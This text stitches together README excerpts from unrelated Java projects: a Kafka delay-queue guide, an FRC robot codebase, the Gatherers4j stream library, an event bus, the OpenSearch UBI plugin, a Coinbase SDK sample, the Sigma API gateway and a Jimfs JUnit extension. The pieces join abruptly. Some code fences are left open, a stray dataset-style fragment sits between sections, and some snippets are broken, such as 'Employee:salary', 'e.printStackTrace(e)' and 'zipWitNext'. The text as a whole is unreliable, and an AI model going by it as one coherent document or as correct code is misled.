        Long level = KafkaDelayUtil.fetchIntialLevel(duration.toSeconds());
        

        kafkaTemplate.send(
                kafkaDelayUtil.fetchTopicByLevel(level),
                ObjectMapperUtil.stringify(kafkaMsg, Boolean.TRUE));
        
    }
}

```


### 5. Start Listening Messages in the destination topic

```java
@Slf4j
@Component
public class KafkaReconWorker {

    @KafkaListener(
            topics = ""xyz.delay-queue.final"")
    public void listen(String message) {

        KafkaDelayedQueueMessage delayedQueueMsg =
                ObjectMapperUtil.readValue(message, KafkaDelayedQueueMessage.class, Boolean.FALSE);

        System.out.println(""Message Received :: "" + delayedQueueMsg.getMessage());
        ....
    }
}

```

## Highlights
- Drivetrain

    The swerve drivetrain features a [custom Phoenix 6 enabled odometry class](/src/main/java/com/team1678/frc2024/subsystems/WheelTracker.java) and [pure pursuit path following](/src/main/java/com/team1678/lib/swerve/DriveMotionPlanner.java) for consistent autonomous driving.

- Vision Pose Correction

    The robot continously records and stores the most recent vision and odometry updates in a [robot state class](/src/main/java/com/team1678/frc2024/RobotState.java#L33), and feeds the information into an [extended kalman filter](/src/main/java/com/team1678/frc2024/RobotState.java#L114). The localization factors in [number of tags seen, average distance to tags, and closest tag](/src/main/java/com/team1678/frc2024/subsystems/vision/VisionDevice.java#L69) when calculating trust factor.

- Auto Aim

    Using the relative transform to either the speaker or ferry target, swerve drivetrain overrides driver and path heading control when instructed to auto-align. The [superstructure](/src/main/java/com/team1678/frc2024/subsystems/Superstructure.java) uses the pose from localization and [multiple regression maps](/src/main/java/com/team1678/frc2024/shooting/RegressionMaps.java) to calculate the target drivetrain angle, shooter angle, and shooter RPM for either [shooting](/src/main/java/com/team1678/frc2024/shooting/ShootingUtil.java) or [ferrying](/src/main/java/com/team1678/frc2024/shooting/FerryUtil.java).

- Superstructure Control

    The elevator, intake, three indexer rollers are controlled using a [request queue](/src/main/java/com/team1678/lib/requests/). Desired actions are added to the queue by calling the appropiate [state or transition method](/src/main/java/com/team1678/frc2024/subsystems/Superstructure.java#L367), which adds a chain of requests to be sequentially run.

## Notable Package Functions

```

#### Moving average of `Stream<BigDecimal>`

```java
Stream
    .of(""1.0"", ""2.0"", ""10.0"", ""20.0"", ""30.0"")

```

#### Ensure the stream is exactly `n` elements long

```java
// Good

Stream.of(""A"", ""B"", ""C"").gather(Gatherers4j.exactSize(3)).toList();
// [""A"", ""B"", ""C""]

// Bad
Stream.of(""A"").gather(Gatherers4j.exactSize(3)).toList();
// IllegalStateException
```

#### Filter a stream, knowing the index of each element

```java
Stream.of(""A"", ""B"", ""C"", ""D"")
      .gather(Gatherers4j.filterWithIndex((index, element) -> index % 2 == 0 || element.equals(""D"")))
      .toList();

// [""A"", ""C"", ""D""]
```

### Group identical elements

```java
Stream.of(""A"", ""A"", ""B"", ""B"", ""B"", ""C"")
    .gather(Gatherers4j.grouping())
    .toList();

// [[""A"", ""A""], [""B"", ""B"", ""B""], [""C""]]
```

### Group identical elements as measured by a function

```java
Stream.of(""A"", ""B"", ""AA"", ""BB"", ""CC"", ""DDD"")
    .gather(Gatherers4j.groupingBy(String::length))
    .toList();

// [[""A"", ""B""], [""AA"", ""BB"", ""CC""], [""DDD""]]
```


#### Interleave streams of the same type into one stream

```java
final Stream<String> left = Stream.of(""A"", ""B"", ""C"");
final Stream<String> right = Stream.of(""D"", ""E"", ""F"");

left.gather(Gatherers4j.interleave(right)).toList();

// [""A"", ""D"", ""B"", ""E"", ""C"", ""F""]
```

#### Limit the stream to the `last` _n_ elements

```java
Stream
    .of(""A"", ""B"", ""C"", ""D"", ""E"", ""F"", ""G"")
    .gather(Gatherers4j.last(3))
    .toList();

// [""E"", ""F"", ""G""]
```

#### Find the object with the maximum mapped value

```java
record Employee(String name, int salary) {}

streamOfEmployees
    .gather(Gatherers4j.maxBy(Employee:salary))
    .toList();

// Employee(""Big Shot"", 1_000_000)
```

#### Find the object with the minimum mapped value

```java
record Person(String name, int age) {}

streamOfPeople
    .gather(Gatherers4j.minBy(Person:age))
    .toList();

// Person(""Baby"", 1)
```

#### Reverse the order of the stream

```java
Stream
    .of(""A"", ""B"", ""C"")
    .gather(Gatherers4j.reverse())
    .toList();

// [""C"", ""B"", ""A""]
```

#### Include index with original stream values

```java
Stream
    .of(""A"", ""B"", ""C"")
    .gather(Gatherers4j.withIndex())
    .toList();

// [IndexedValue(0, ""A""), IndexedValue(1, ""B""), IndexedValue(2, ""C"")]
```

#### Shuffle the stream into a random order

```java
Stream
     .of(""A"", ""B"", ""C"", ""D"" ,""E"")
     .gather(Gatherers4j.shuffle())
     .toList();

// ex: [""B"", ""E"", ""A"", ""C"", ""D""] -- or some other randomly arranged stream
```

#### Shuffle the stream into a random order, with a specific `RandomGenerator`

```java
Stream
     .of(""A"", ""B"", ""C"", ""D"" ,""E"")
     .gather(Gatherers4j.shuffle(RandomGenerator.of(""someGenerator"")))
     .toList();

// ex: [""B"", ""E"", ""A"", ""C"", ""D""] -- or some other randomly arranged stream
```

#### Throttle the number of elements consumed in a period

```java
Stream
    .of(""A"", ""B"", ""C"")
    .gather(Gatherers4j.throttle(2, Duration.ofSeconds(1))) // Two per second
    .toList();

// [""A"", ""B"",   ""C""]
              ^
              |
              +----------- Pause
```


#### Zip two streams of together into a `Stream<Pair>`

The left and right streams can be of different types.

```java
final Stream<String> left = Stream.of(""A"", ""B"", ""C"");
final Stream<Integer> right = Stream.of(1, 2, 3);

left.gather(Gatherers4j.zip(right)).toList();

// [Pair(""A"", 1), Pair(""B"", 2), Pair(""C"", 3)] 

```

#### Zip elements of a stream together

This converts a `Stream<T>` to a `Stream<List<T>>`

```java
Stream
     .of(""A"", ""B"", ""C"", ""D"", ""E"")
     .gather(Gatherers4j.zipWitNext())
     .toList();

// [[""A"", ""B""], [""B"", ""C""], [""C"", ""D""], [""D"", ""E""]]
```

## Streams of `BigDecimal`

Functions which modify output and are available on all `BigDecimal` gatherers (simple average, moving average, and standard deviation).

| Function                       | Purpose                                                                                                                                   |
|--------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------|
| `treatNullAsZero()`            | When an element in the `Stream<BigDecimal>` is `null` treat it as `BigDecimal.ZERO` instead of skipping it in the calculation.            |
| `treatNullAs(BigDecimal)`      | When an element in the `Stream<BigDecimal>` is `null` treat it as the `BigDecimal` value given instead of skipping it in the calculation. |
| `withMathContext(MathContext)` | Switch the `MathContext` for all calculations to the non-null `MathContext` given. The default is `MathContext.DECIMAL64`.                |
| `withOriginal()`               | Include the original stream value in addition to the calculated value.                                                                    |

Note that rounding mode, precision, and scale are derived from the `MathContext`.

### Example of `simpleRunningAverage()`

This example creates a stream of `double`, converts each value to a `BigDecmial`, and takes a `simpleMovingAverage` over 10 trailing values.
It will `includePartialValues` and sets the `MathContext` to the values given. Additionally, nulls
are treated as zeros, and the calculated average is returned along with the original value.

```java
someStreamOfBigDecimal()
    .gather(Gatherers4j
        .simpleMovingAverage(10)
        .includePartialValues()
        .withMathContext(MathContext.DECIMAL32)
        .treatNullAsZero()
        .withOriginal()
    )
    .toList();

// Example output:
[
  WithOriginal[original=0.8462487, calculated=0.8462487], 
  WithOriginal[original=0.8923297, calculated=0.8692890], 
  WithOriginal[original=0.2556937, calculated=0.6647573], 
  WithOriginal[original=0.2901778, calculated=0.5711125], 
  WithOriginal[original=0.4945578, calculated=0.5558016], 
  WithOriginal[original=0.3173066, calculated=0.5160525], 
  WithOriginal[original=0.6377766, calculated=0.5334417], 
  WithOriginal[original=0.1729199, calculated=0.4883765], 
  WithOriginal[original=0.7408201, calculated=0.5164258], 
  WithOriginal[original=0.7169926, calculated=0.5364825], 
  WithOriginal[original=0.5174489, calculated=0.5036025], 
  WithOriginal[original=0.5895662, calculated=0.4733262], 
  WithOriginal[original=0.4458275, calculated=0.4923396], 
  // etc...
]
```

# Project Philosophy

1. Consider adding a gatherer if it cannot be implemented with `map`, `filter`, or a collector without enclosing outside state.
2. Resist the temptation to add functions that only exist to provide an alias. They seem fun/handy but add surface area to the API and must be maintained forever.
3. All features should be documented and tested.

[![CodeFactor](https://www.codefactor.io/repository/github/starobot/staroeventsystem/badge)](https://www.codefactor.io/repository/github/starobot/staroeventsystem)

An EXTREMELY FAST java event system. This is the continuation of the @ARZI1 event system <br>
https://github.com/ARZI1/eventsystem

Here are the benchmark comparison between StaroEventSystem, Orbit and Energy and Pingbypass Event Bus upon posting one million events: <br>
Staro: 16 ms <br>
Orbit: 44 ms <br>
Energy: 85 ms <br>
Pingbypass: 28 ms <br>
https://github.com/MeteorDevelopment/orbit <br>
https://github.com/QuantumClient/Energy <br>
https://github.com/3arthqu4ke/pingbypass <br>

### How to use the subscription and posting:
```java
EventBus eventBus = new EventBus();

// to post the custom event
eventBus.post(new Event());

// to subscribe the current instance
eventBus.subscribe(this);
eventBus.subsribe(new TickListener);
```

### How to create listeners:
```java
@Listener
public void invoke(Event event) // the method must be public
{
  event.getSomething();
}
### How to override the EventBus and create more generic listeners
Override the GenericListener or implement an EventListener interface to your custom generic listener.
```java
public class CustomGenericListener extends GenericListener
{
    public CustomGenericListener(Object instance, Method method, int priority)
    {
        super(instance, method, priority);
    }

    @Override
    public void invoke(Object event)
    {
        // add the additional functionality before using the super.invoke(Object event) method.
    }
}
```
Create annotation for the CustomGenericListener
```java
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.METHOD)
public @interface CustomListener
{
    Priority priority() default Priority.DEFAULT;
}
```
Then override EventBus to register the new generic listener with it's annotation.
```java
public class CustomEventBus extends EventBus
{
    public CustomEventBus()
    {
        super.registerListenerFactory(CustomListener.class, (instance, method) ->
                new CustomGenericListener(instance, method, method.getAnnotation(CustomListener.class).priority().getVal())
        );
    }
}
```
Now you are golden:
```java
CustomEventBus eventBus = new CustomEventBus();
```

opensearch-project/user-behavior-insights,main,"# OpenSearch User Behavior Insights

This repository contains the OpenSearch plugin for the User Behavior Insights (UBI) capability. This plugin
facilitates persisting client-side events (e.g. item clicks, scroll depth) and OpenSearch queries for the purpose of analyzing the data
to improve search relevance and user experience.

UBI and this plugin project was originally proposed in the [OpenSearch UBI RFC](https://github.com/opensearch-project/OpenSearch/issues/12084).

## UBI Schemas

Please note that this repository is the implementation of the UBI plugin for OpenSearch.

> [!IMPORTANT] 
> This release targets to the 1.0.0 version of the UBI Specification.

For details on the JSON Schema used by UBI to send and receive queries and events please see the [UBI](https://github.com/o19s/ubi) repository and the links below.
* [Query Request Schema](https://o19s.github.io/ubi/docs/html/query.request.schema.html)
* [Query Response Schema](https://o19s.github.io/ubi/docs/html/query.response.schema.html)
* [Event Schema](https://o19s.github.io/ubi/docs/html/event.schema.html)

## UBI, Data Prepper, and Open Telemetry

The UBI plugin can store UBI query data in one of three ways:

- By directly indexing the UBI query data in the `ubi_queries` index in the same OpenSearch cluster as the plugin.
- By sending the UBI query data as JSON to a Data Prepper [http](https://opensearch.org/docs/latest/data-prepper/pipelines/configuration/sources/http/) source. The Data Prepper endpoint is provided via the `ubi.dataprepper.url` setting.
- By sending the UBI query data as Open Telemetry traces. This utilizes the native OpenSearch OTel capabilities which are exposed via the `TelemetryAwarePlugin` interface. As UBI queries are received, trace events will be generated. OpenSearch must be configured as described in [Distributed tracing](https://opensearch.org/docs/latest/observing-your-data/trace/distributed-tracing/) for the events to be sent.

## Getting Help

* Start with the [Documentation](https://opensearch.org/docs/latest/search-plugins/ubi/index/) site to how to use this plugin.
* For questions or help getting started, please find us in the [OpenSearch Slack](https://opensearch.org/slack.html) in the `#plugins` channel.
* For bugs or feature requests, please create [a new issue](https://github.com/o19s/opensearch-ubi/issues/new/choose).

## Useful Commands

The `scripts/` directory contains example UBI requests for common use cases.

## User Quick Start

### Installing the Plugin

To get started, download the plugin zip file from the [releases](https://github.com/o19s/opensearch-ubi/releases). Next, install the plugin into OpenSearch with the following command:

```
bin/opensearch-plugin install file:/opensearch-ubi-1.0.0-os2.14.0.zip
```

You will be prompted while installing the plugin because the plugin defines additional security permissions. These permissions allow the plugin to serialize query requests to JSON for storing and to allow the plugin to send query requests to Data Prepper. You can skip the prompt by adding the `--batch` argument to the above command.

To create the UBI indexes called `ubi_queries` and `ubi_events`, send a query to an OpenSearch index with the `ubi` query block added:

```
curl -s http://localhost:9200/ecommerce/_search -H ""Content-Type: application/json"" -d'
 {
  ""ext"": {
   ""ubi"": {
    }
   },
   ""query"": {
     ""match"": {
       ""name"": ""toner""
     }
   }
 }'
```

These indexes can also be created manually by using the [mapping files](https://github.com/o19s/opensearch-ubi/tree/2.14.0/src/main/resources):

```
curl -s -X PUT ""http://localhost:9200/ubi-events"" -H ""Content-Type: application/json"" --data-binary @/path/to/events-mapping.json
curl -s -X PUT ""http://localhost:9200/ubi-queries"" -H ""Content-Type: application/json"" --data-binary @/path/to/events-queries.json
```

### Capturing Queries

Queries sent to OpenSearch containing a `ubi` section in the `ext` block will be captured by the plugin and stored in the `ubi_queries` index. For example:

```
curl -s http://localhost:9200/your-index/_search -H ""Content-Type: application/json"" -d'
 {
  ""ext"": {
   ""ubi"": {
     ""query_id"": ""12300d16cb-b6f1-4012-93ebcc49cac90426""
    }
   },
   ""query"": {
     ""match"": {
       ""name"": ""toner""
     }
   }
 }'
```

As shown in the query above, the presence of the `ubi` block in the `ext` section causes the UBI plugin to capture the query and store it in the `ubi_queries` index.
The `ubi` block can contain the following parameters. All parameters are optional.

* `query_id` - A unique identifier for the query. If not provided, the plugin will generate a random UUID for the query and return the UUID in the query response. The `query_id` can be in any format but we use UUIDs in the examples.
* `user_query` - The user-entered query. This is meant to be the actual text the user provided to initiate the search.
* `client_id` - A unique identifier for the originator of the query. The client may be a user, an application, or any other originator of the query. The `client_id` can be in any format but we use UUIDs in the examples.
* `object_id_field` - The name of a field in the index that contains a unique identifier for each result. If not provided, the `_id` field is used.
* `query_attributes` - A map of arbitrary key/value pairs that will be indexed along with the query. This can be used to capture additional information about the query, such as an experiment ID or other details.

Following is an example query that provides the parameters:

```
curl -s http://localhost:9200/your-index/_search -H ""Content-Type: application/json"" -d'
 {
  ""ext"": {
   ""ubi"": {
     ""query_id"": ""12300d16cb-b6f1-4012-93ebcc49cac90426"",
     ""user_query"": ""Toner"",
     ""client_id"": ""c4af7ca2-d6d2-4326-a41f-e616ebdd3d7b"",
     ""object_id_field"": ""product_name"",
     ""query_attributes"": {
       ""experiment_id"": ""12345""
     }
    }
   },
   ""query"": {
     ""match"": {
       ""name"": ""toner""
     }
   }
 }'
```

Similar to a query request, query responses will also include a `ubi` section in the `ext` block.

```
{
  ""took"": 3,
  ""timed_out"": false,
  ""_shards"": {
    ""total"": 1,
    ""successful"": 1,
    ""skipped"": 0,
    ""failed"": 0
  },
  ""hits"": {
    ""total"": {
      ""value"": 1,
      ""relation"": ""eq""
    },
    ""max_score"": 2.2413535,
    ""hits"": [
      {
        ""_index"": ""ecommerce"",
        ""_id"": ""968447"",
        ""_score"": 2.2413535,
        ""_source"": {
          ""id"": ""968447"",
          ""name"": ""Cyan Toner Cartridge""
        }
      }
    ]
  },
  ""ext"": {
    ""ubi"": {
      ""query_id"": ""12300d16cb-b6f1-4012-93ebcc49cac90426""
    }
  }
}
```

The only field present in the query response will be the `query_id`. The value of the `query_id` is the same as the `query_id` provided in the query, or, if not provided, a random UUID.

### Indexing Queries

Queries can be either indexed in the local OpenSearch in the `ubi_queries` index, or queries can be sent to a Data Prepper `http_source` endpoint.

By default, queries are written to the local OpenSearch `ubi_queries` index as they are received. To see how the query is indexed, you can search the `ubi_queries` index:

```
curl -s http://localhost:9200/ubi_queries/_search -H ""Content-Type: application/json"" | jq
{
  ""took"": 3,
  ""timed_out"": false,
  ""_shards"": {
    ""total"": 1,
    ""successful"": 1,
    ""skipped"": 0,
    ""failed"": 0
  },
  ""hits"": {
    ""total"": {
      ""value"": 1,
      ""relation"": ""eq""
    },
    ""max_score"": 1,
    ""hits"": [
      {
        ""_index"": ""ubi_queries"",
        ""_id"": ""6CrooY8BzxoaOvIPKtWj"",
        ""_score"": 1,
        ""_source"": {
          ""query_response_id"": ""e4bdd289-0875-421f-bc34-aa71eb8e1cb3"",
          ""user_query"": ""toner"",
          ""query_id"": ""12300d16cb-b6f1-4012-93ebcc49cac90426"",
          ""query_response_object_ids"": [
            ""9""
          ],
          ""client_id"": null,
          ""query"": ""{\""query\"":{\""match\"":{\""name\"":{\""query\"":\""toner\"",\""operator\"":\""OR\"",\""prefix_length\"":0,\""max_expansions\"":50,\""fuzzy_transpositions\"":true,\""lenient\"":false,\""zero_terms_query\"":\""NONE\"",\""auto_generate_synonyms_phrase_query\"":true,\""boost\"":1.0}}},\""ext\"":{\""query_id\"":\""12300d16cb-b6f1-4012-93ebcc49cac90426\"",\""user_query\"":\""toner\"",\""client_id\"":null,\""object_id_field\"":null,\""query_attributes\"":{\""system\"":\""my_system\"",\""experiment\"":\""exp_1\""}}}"",
          ""timestamp"": 1716408298072
        }
      }
    ]
  }
```

Each indexed query will have the following fields:

* `query_response_id` - A unique identifier for the query response.
* `user_query`- Corresponds to the `user_query` in the query request.
* `query_id` - Corresponds to the `query_id` in the query request, or a random UUID if a `query_id` was not provided in the query request.
* `query_response_object_ids` - A list of the values of the `object_id_field` field in the document.
* `client_id` - Corresponds to the `client_id` in the query request.
* `query` - The raw query that was provided to OpenSearch.
* `timestamp` - The Unix timestamp when the query was indexed.

#### Sending Queries to Data Prepper

To send queries to Data Prepper, configure the following properties in OpenSearch:

| Property            | Description                           | Example Value                 |
|---------------------|---------------------------------------|-------------------------------|
| ubi.dataprepper.url | Data Prepper's `http_source` endpoint | `http://localhost:2021/log/ingest` |

With these properties set, queries will no longer be indexed into the local OpenSearch. The `ubi_queries` index can be deleted. Queries will be sent to Data Prepper as they are received by OpenSearch.

### Capturing Events

The UBI plugin does *not* provide a way to capture client-side events. Sending client-side events requires action on the client to send the events to OpenSearch for indexing.

The following is an example of a client-side event. [Additional examples are available.](https://github.com/o19s/ubi/tree/main/samples)

```
curl -s -X POST http://localhost:9200/ubi_events/_doc/ -H ""Content-Type: application/json"" -d'
 {
  ""action_name"": ""page_exit"",
  ""user_id"": ""1821196507152684"",
  ""query_id"": ""00112233-4455-6677-8899-aabbccddeeff"",
  ""session_id"": ""c3d22be7-6bdc-4250-91e1-fc8a92a9b1f9"",
  ""page_id"": ""/docs/latest/"",
  ""timestamp"": ""2024-05-16T12:34:56.789Z"",
  ""message_type"": ""INFO"",
  ""message"": ""On page /docs/latest/ for 3.35 seconds"",
  ""event_attributes"": {
    ""position"":{},
    ""object"": {
      ""idleTimeoutMs"": 5000,
      ""currentIdleTimeMs"": 250,
      ""checkIdleStateRateMs"": 250,
      ""isUserCurrentlyOnPage"": true,
      ""isUserCurrentlyIdle"": false,
      ""currentPageName"": ""http://localhost:4000/docs/latest/"",
      ""timeElapsedCallbacks"": [],
      ""userLeftCallbacks"": [],
      ""userReturnCallbacks"": [],
      ""visibilityChangeEventName"": ""visibilitychange"",
      ""hiddenPropName"": ""hidden""
    }
  }
 }'
```

## Analyzing Queries and Client-Side Events

With the queries and client-side events we can use OpenSearch's SQL capability to analyze the data.

### Queries with zero results

We can identify queries with zero results by querying either the `ubi_queries` or `ubi_events` indexes as shown below. Both queries should return the same value.

```sql
select
   count(0)
from ubi_queries
where query_response_object_ids is null
```

```sql
select
	count(0)
from ubi_events
where action_name='on_search' and event_attributes.data.data_detail.query_data.query_response_object_ids is null
order by timestamp
```

### Most Common Client-Side Events

Find the most common client-side events:

```sql
select
	action_name, count(0) Total  
from ubi_events
group by action_name
order by Total desc
```

action_name|Total
|---|---|
on_search|3199
brand_filter|3112
button_click|3150
type_filter|3149
product_hover|3132
product_sort|3115
login|2458
logout|1499
new_user_entry|208

### Client-Side Events Associated ith Queries

All client-side events that are associated with a query should have the same `query_id`.

```sql
select
	action_name, count(0) Total  
from ubi_events
where query_id is not null
group by action_name
order by Total desc
```
action_name|Total
|---|---|
on_search|1329
brand_filter|669
button_click|648
product_hover|639
product_sort|625
type_filter|613
logout|408

## Development

If you find bugs or want to request a feature, please create [a new issue](https://github.com/o19s/opensearch-ubi/issues/new/choose). For questions or to discuss how UBI works, please find us in the [OpenSearch Slack](https://opensearch.org/slack.html) in the `#plugins` channel.

The plugin provides an implementation of an `ActionFilter` plugin that can capture and index queries, a `SearchExtBuilder` that provides the UBI parameters, and the object classes used to index the queries. Testing is done by YAML rest tests and unit tests.

### Building and Testing

The plugin can be built using Gradle:

```
./gradlew build
```

To test and debug, build the OpenSearch docker image that contains the built plugin and then start the containers:

```
docker compose build && docker compose up
```

Or to start a three-node OpenSearch cluster:

```
docker compose build
docker compose -f docker-compose-cluster.yaml up
```

coinbase-samples/advanced-sdk-java,main,"# Coinbase Advanced Trade Java SDK README

## Overview

The *Advanced Java SDK* is a sample library that demonstrates the structure of a [Coinbase Advanced Trade](https://advanced.coinbase.com/) driver for
the [REST APIs](https://docs.cdp.coinbase.com/advanced-trade/reference).

Coinbase Advanced Trade offers a comprehensive API for traders, providing access to real-time market data, order management, and execution. Elevate your trading strategies and develop sophisticated solutions using our powerful tools and features.

## License

The *Advanced Java SDK* sample library is free and open source and released under the [Apache License, Version 2.0](LICENSE).

The application and code are only available for demonstration purposes.

## Usage

To use the *Advanced Java SDK*, initialize the Credentials class and create a new client. The Credentials struct is JSON
enabled. See an example of this inside of the [main.java.com.coinbase.examples package](./src/main/java/com/coinbase/examples/Main.java). Ensure that Advanced API credentials are stored in a secure manner.

The JSON format expected for `Advanced_CREDENTIALS` is:

```
{
  ""apiKeyName"": """",
  ""privateKey"": """",
}
```

Coinbase Advanced API credentials can be created in the Advanced web console under API.

An example of instantiating the credentials and using the PortfoliosService is shown below:

```java
public class Main {
    public static void main(String[] args) {
        String credsStringBlob = System.getenv(""ADVANCED_TRADE_CREDENTIALS"");
        ObjectMapper mapper = new ObjectMapper();

        try {
            CoinbaseAdvancedCredentials credentials = new CoinbaseAdvancedCredentials(credsStringBlob);
            CoinbaseAdvancedClient client = new CoinbaseAdvancedClient(credentials);

            PortfoliosService portfoliosService = AdvancedServiceFactory.createPortfoliosService(client);
            GetPortfolioByIdResponse portfolioResponse = portfoliosService.getPortfolioById(
                    new GetPortfolioByIdRequest.Builder()
                            .portfolioId(portfolioId)
                            .build());

            System.out.println(mapper.writeValueAsString(portfolioResponse));
        } catch (Exception e) {
            e.printStackTrace(e);
        }
    }
}
```

To see a full working example, see the [`Main`](src/main/java/com/coinbase/examples/Main.java) class under the com.coinbase.examples package.

👆[中文文档](./README_zh.md)

##  Introduction

Sigma is a high performances API gateway based on Vertx(Netty), can execute on native image.

### [Based on vertx](https://vertx.io/)
Vertx is a reactive web framework on JVM,  it provides many of out-of-the-box feature.

Thanks to the Vertx ecosystem, Sigma can achieve extremely high performance at a minimal cost.

Here is some vertx module sigma used:
- vertx core
- vertx web
- vertx http proxy
- vertx io_uring

### [Vertx io_uring](https://vertx.io/docs/vertx-io_uring-incubator/java/)
> The new io_uring interface added to the Linux Kernel 5.1 is a high I/O performance scalable interface for fully asynchronous Linux syscalls.

> Vert.x io_uring is based on Netty io_uring, more details on the GitHub project.

U can see more detail in [GitHub Project](https://github.com/netty/netty-incubator-transport-io_uring).

**With thd help of Vertx io_uring,sigma have high IO performance.**

### [Native transports](https://netty.io/wiki/native-transports.html)

> Vert.x can run with native transports (when available) on BSD (OSX) and Linux, these JNI transports add features specific to a particular platform, generate less garbage, and generally improve performance when compared to the NIO based transport.

**Sigma has improved data transfer speed with the help of Native Transport, although it can only work on some Linux and BSD systems, fortunately most services run on these systems.**

### [GraalVM native image](https://www.graalvm.org/latest/reference-manual/native-image/)

> Native Image is a technology to compile Java code ahead-of-time to a binary—a native executable. A native executable includes only the code required at run time, that is the application classes, standard-library classes, the language runtime, and statically-linked native code from the JDK.

When running applications as native executable files, compared to traditional Java running methods, it will have advantages such as faster startup speed, smaller packaging size, and smaller runtime memory usage.

**Sigma can be executed  as native executable files ,and it will adapt to the cloud native era better.**

**WARNING:**

By checking [GitHub actions runner image](https://github.com/actions/runner-images?tab=readme-ov-file) pre-installed software and [GraalVM Native image prerequisites](https://www.graalvm.org/latest/reference-manual/native-image/#prerequisites) requirements in GitHub actions, we found that the Windows 11 SDK is missing from the windows latest image of Github actions runner. If you need to use Sigma binary files for the Windows platform, please compile them yourself according to the documentation or deploy Sigma using Jar.

### [JAVA virtual thread](https://openjdk.org/jeps/444)

> Virtual threads are not faster threads — they do not run code any faster than platform threads. They exist to provide scale (higher throughput), not speed (lower latency). There can be many more of them than platform threads, so they enable the higher concurrency needed for higher throughput according to Little's Law.

For IO intensive tasks, the load is usually not limited by the CPU, and in this case, even if the number of threads exceeds the number of cores, throughput cannot be improved.

> Virtual threads help to improve the throughput of typical server applications precisely because such applications consist of a great number of concurrent tasks that spend much of their time waiting.

Unlike the OS threading model (which typically manages threads through thread pools to reduce the overhead of creating threads and reusing threads), virtual threads provide higher throughput while not offering lower latency.

**Sigma have a high concurrency performance with the help of Vertx's support for virtual thread.**

## Feature List

1. **Route**
2. **Upstream**
3. **reverse-proxy**
4. **Load balance**
5. **plugin**

## Example Usage

### binary
To begin, download the latest program for your operating system and architecture from the Release page.

Next, place the sigma binary and configuration file on your server.

Finally, edit the configuration.

#### Access your computer in a LAN network via SSH

##### Step 1 : modify `sigma.json` file.

As we can see, it has 5 part to edit. The part of `proxy-server` is a proxy server protocol config, u can just use it by default.

`port: 80`:  means sigma http proxy server will bind on port 80.

```json
{
  ""proxy-server"": {
    ""http"": {
      ""id"": ""http-proxy-server"",
      ""server-id"": ""http-proxy-server"",
      ""port"": 80
    }
  }
}
```
The part of `proxy-client` is a http proxy server config, we don't need to modify except we want to adjust it to improve some performances.  
```json
{
  ""proxy-client"": {
    ""max-pool-size-per-server"": 256
  }
}
```
The part of router is a main config which decide what request the proxy will handler.

`proxy-server-id`: it config this router is belonged to which proxy server.

`route`: it define an array of http request path to handle.

`proxy-pass-id`: This configuration determines which proxy pass rule it will submit the request to.
```json
{
  ""router"": [
    {
      ""id"": ""router-first"",
      ""enable"": true,
      ""proxy-server-id"": ""http-proxy-server"",
      ""route"": [
        {
          ""id"": ""router-first-route-first"",
          ""enable"": true,
          ""path"": ""/test/*"",
          ""allow-method"": [],
          ""consumes"": [],
          ""produces"": [],
          ""proxy-pass-id"": ""proxy-pass-1""
        }
      ]
    }
  ]
}
```
The part of `proxy-pass` is a main config, this configuration determines how to handle requests received by the proxy server.

`upstream-id`: this proxy requst will send to which upsteam.

```json
{
  ""proxy-pass"": [
    {
      ""id"": ""proxy-pass-1"",
      ""upstream-id"": ""upstream-static-service-1""
    }
  ]
}
```

The part of `upstream` is a main config, this configuration define the server discoverty method , load balance rule, and upstream nodes.

This is a simple example, it means we will send proxy request to `http://localhost:8888` by `round-robin`, and the upsteam list is a static config.
```json
{
  ""upstream"": [
    {
      ""id"": ""upstream-static-service-1"",
      ""discovery"": ""static-config"",
      ""rule-strategy"": ""round-robin"",
      ""nodes"": [
        ""http://localhost:8888""
      ]
    }
  ]
}
```

#### step2 : start sigma

```shell
./sigma run net.oooops.sigma.Sigma -conf ${absolute path of sigma.json file} -options ${${absolute path of options.json file}} -instance 1 
```

### jar

#### step1
The step 1 are similar to the binary step 1.

#### 

```shell
java -jar sigma-vX.X.X-fat.jar ./sigma run net.oooops.sigma.Sigma -conf ${absolute path of sigma.json file} -options ${${absolute path of options.json file}} -instance 1
```

## Roadmap

![ROADMAP](./image/SIGMA-ROADMAP-V0.1.0-ALPHA.png)

## Milestone

- 2024-10-08 the version 0.1.0-alpha is done.

## Benchmark

### Benchmark Environments

Apple M1 Pro(10 vCPUs, 16 GB memory)

### Benchmark Test for reverse proxy

Only use sigma as the reverse proxy server,include path rewrite plugin,with no logging,or other plugins enabled.

### QPS

Because of M1 Pro CPU arch , it dont have Hyper-Threading tech, so, The test use 4 core for wrk, 4 core for nginx or sigma reverse proxy, and 2 core for upstream, upstream is only return a simple json response:

```json
{
  ""code"": 200,
  ""msg"": ""success"",
  ""data"": null
}
```
#### Upstream(on port 8888 and 8889)

```wiki
~ % wrk -t8 -c2000 -d30s http://localhost:8888

```

#### Sigma(on port 80, path rewrite /test/* to /):

```wiki
~ % wrk -t8 -c2000 -d1m http://localhost/test/benchmark   
Running 1m test @ http://localhost/test/benchmark
  8 threads and 2000 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency     3.53ms    2.13ms 137.37ms   88.09%
    Req/Sec     8.55k     2.83k   14.77k    70.42%
  4087162 requests in 1.00m, 654.83MB read
  Socket errors: connect 1756, read 189, write 0, timeout 0
Requests/sec:  68079.91
Transfer/sec:     10.91MB
```
Sigma is just a little bit faster than Nginx in some situation, but it's still very fast and we have a lot of room to improve.

This project provides a [JUnit Jupiter][] extension for in-memory
[`@TempDir`](https://junit.org/junit5/docs/current/api/org.junit.jupiter.api/org/junit/jupiter/api/io/TempDir.html)
directories via the [Jimfs][] file system.

## Motivation

Today, it is already possible to use Jimfs and JUnit Jupiter together to create in-memory temporary directories for
testing.
However, it requires Jimfs in-memory file system handling hooked into JUnit Jupiter test lifecycle callbacks,
a boilerplate that users must implement on their own.

Starting from [version 5.10](https://junit.org/junit5/docs/5.10.0/release-notes/index.html#release-notes),
JUnit Jupiter offers a
[`TempDirFactory` SPI](https://junit.org/junit5/docs/5.10.0/user-guide/#writing-tests-built-in-extensions-TempDirectory)
for customizing how temporary directories are created via the `@TempDir` annotation.
The SPI allows libraries like Jimfs to provide their implementation.

First-party support was requested in [google/jimfs#258](https://github.com/google/jimfs/issues/258).
However, Google has not yet started using JUnit Jupiter, and such first-party support may only be provided when
Google does so.

Because of that, this extension was created to aid all the users who would like a smooth integration between Jimfs
and JUnit Jupiter.
This project will likely be discontinued if Google ever offers first-party support for this integration.

## Compatibility

